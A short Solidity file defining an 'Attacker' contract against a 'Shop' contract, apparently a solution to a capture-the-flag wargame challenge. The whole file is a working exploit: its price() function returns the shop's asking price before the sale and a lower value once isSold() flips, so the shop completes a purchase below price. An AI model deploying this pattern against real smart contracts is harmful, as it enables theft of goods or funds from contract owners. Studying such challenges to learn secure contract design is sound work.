pragma solidity ^0.8.0;

import "./Shop.sol";

contract Attacker {
    Shop shop;
    
    constructor(address payable shopAddress) {
        shop = Shop(shopAddress);
    }

    function attack() public {
       shop.buy();
    }

    function price() public view returns (uint) {
        if (shop.isSold()) {
            return 46;
        } else {
            return shop.price();
        }
    }
}